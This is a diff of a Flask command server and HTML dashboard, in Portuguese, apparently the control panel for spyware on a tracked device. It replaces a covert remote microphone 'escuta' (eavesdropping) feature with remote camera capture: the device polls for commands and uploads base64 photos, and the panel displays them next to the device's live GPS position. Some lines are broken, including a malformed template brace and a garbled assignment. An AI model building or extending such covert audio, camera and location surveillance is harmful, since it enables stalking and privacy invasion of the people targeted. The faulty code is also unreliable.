@@ -31,9 +31,9 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .map-container { width: 100%; height: 300px; border-radius: 8px; background: #040a0f; border: 1px solid #1e293b; margin-bottom: 15px; }
         .status-tag { background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
         .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; margin-bottom: 12px; }
-        .btn-audio { display: block; width: 100%; background: #ea580c; color: #ffffff; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; cursor: pointer; }
-        .btn-audio.ativo { background: #dc2626; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
+        .btn-camera { display: block; width: 100%; background: #38bdf8; color: #070f15; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; letter-spacing: 1px; cursor: pointer; margin-bottom: 15px; }
+        .photo-container { width: 100%; border: 1px solid #1e293b; border-radius: 8px; background: #040a0f; text-align: center; overflow: hidden; display: none; margin-top: 10px; }
+        .photo-container img { width: 100%; height: auto; display: block; }
     </style>
 </head>
 <body>
@@ -69,50 +69,47 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     🗺️ Abrir no Google Maps
                 </a>
 
-                <button id="btnAudio" class="btn-audio" onclick="alternarAudio()">🎙️ Ativar Áudio Coleta</button>
-                <audio id="audioPlayer" autoplay></audio>
+                <button id="btnCam" class="btn-camera" onclick="dispararCaptura()">📸 Capturar Foto Remota</button>
+                
+                <div id="photoFrame" class="photo-container">
+                    <img id="targetPhoto" src="" alt="Captura Remota">
+                </div>
             </div>
 
             <script>
                 let lastValidLat = {{ info_moto.lat }};
-                let lastValidLon = {{ info_moto.lon }};
-                let audioAtivo = false;
-                let audioInterval = null;
+                let lastValidLon = {{ info_moto.lon };
                 
                 const map = L.map('map_private', { zoomControl: false }).setView([lastValidLat, lastValidLon], 16);
                 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
                 let marker = L.marker([lastValidLat, lastValidLon]).addTo(map);
 
-                async function alternarAudio() {
-                    const btn = document.getElementById('btnAudio');
-                    audioAtivo = !audioAtivo;
+                async function dispararCaptura() {
+                    const btn = document.getElementById('btnCam');
+                    btn.innerText = "⏳ Capturando...";
+                    btn.disabled = true;
                     
-                    if(audioAtivo) {
-                        btn.innerText = "🛑 Desativar Escuta";
-                        btn.classList.add('ativo');
-                        
-                        // Liga a escuta buscando áudio via HTTP pooling a cada 3 segundos
-                        await fetch('/api/comando_audio/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'start'}), headers: {'Content-Type': 'application/json'} });
-                        
-                        audioInterval = setInterval(async () => {
-                            try {
-                                const res = range = await fetch('/api/get_audio/{{ id_buscado }}');
-                                if (res.ok) {
-                                    const data = await res.json();
-                                    if(data.audio) {
-                                        document.getElementById('audioPlayer').src = "data:audio/mp3;base64," + data.audio;
-                                    }
+                    // Envia ordem para o banco de dados do servidor
+                    await fetch('/api/comando_camera/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'take'}), headers: {'Content-Type': 'application/json'} });
+                    
+                    // Começa a monitorar se a foto chegou a cada 2 segundos
+                    let checagem = setInterval(async () => {
+                        try {
+                            const res = await fetch('/api/get_camera/{{ id_buscado }}');
+                            if (res.ok) {
+                                const data = await res.json();
+                                if(data.photo) {
+                                    clearInterval(checagem);
+                                    const frame = document.getElementById('photoFrame');
+                                    const img = document.getElementById('targetPhoto');
+                                    img.src = "data:image/jpeg;base64," + data.photo;
+                                    frame.style.display = "block";
+                                    btn.innerText = "📸 Capturar Foto Remota";
+                                    btn.disabled = false;
                                 }
-                            } catch(e){}
-                        }, 3000);
-
-                    } else {
-                        btn.innerText = "🎙️ Ativar Áudio Coleta";
-                        btn.classList.remove('ativo');
-                        clearInterval(audioInterval);
-                        await fetch('/api/comando_audio/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'stop'}), headers: {'Content-Type': 'application/json'} });
-                        document.getElementById('audioPlayer').src = "";
-                    }
+                            }
+                        } catch(e){}
+                    }, 2000);
                 }
 
                 setInterval(async () => {
@@ -180,31 +177,35 @@ def update():
     db_dispositivos[device_id]["uptime"] = data.get("uptime", "Ativo")
     db_dispositivos[device_id]["lat"] = float(data.get("lat", -16.6869))
     db_dispositivos[device_id]["lon"] = float(data.get("lon", -49.2648))
-    return jsonify({"status": "success", "comando": db_dispositivos[device_id].get("cmd_audio", "stop")}), 200
+    
+    # Responde com o comando da câmera pendente
+    cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
+    db_dispositivos[device_id]["cmd_cam"] = "wait" # Consome o comando
+    return jsonify({"status": "success", "comando_cam": cmd_cam}), 200
 
-@app.route('/api/comando_audio/<device_id>', methods=['POST'])
-def comando_audio(device_id):
+@app.route('/api/comando_camera/<device_id>', methods=['POST'])
+def comando_camera(device_id):
     data = request.get_json(force=True, silent=True) or {}
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    db_dispositivos[device_id]["cmd_audio"] = data.get("acao", "stop")
+    db_dispositivos[device_id]["cmd_cam"] = data.get("acao", "wait")
     return jsonify({"status": "ok"}), 200
 
-@app.route('/api/upload_audio', methods=['POST'])
-def upload_audio():
+@app.route('/api/upload_camera', methods=['POST'])
+def upload_camera():
     data = request.get_json(force=True, silent=True) or {}
     dev_id = data.get("device_id")
     if dev_id:
         if dev_id not in db_dispositivos: db_dispositivos[dev_id] = {}
-        db_dispositivos[dev_id]["audio_b64"] = data.get("audio")
+        db_dispositivos[dev_id]["photo_b64"] = data.get("photo")
     return jsonify({"status": "stored"}), 200
 
-@app.route('/api/get_audio/<device_id>')
-def get_audio(device_id):
+@app.route('/api/get_camera/<device_id>')
+def get_camera(device_id):
     if device_id in db_dispositivos:
-        audio = db_dispositivos[device_id].get("audio_b64", "")
-        db_dispositivos[device_id]["audio_b64"] = "" # Limpa após ouvir
-        return jsonify({"audio": audio}), 200
-    return jsonify({"audio": ""}), 404
+        photo = db_dispositivos[device_id].get("photo_b64", "")
+        db_dispositivos[device_id]["photo_b64"] = "" # Limpa após baixar
+        return jsonify({"photo": photo}), 200
+    return jsonify({"photo": ""}), 404
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
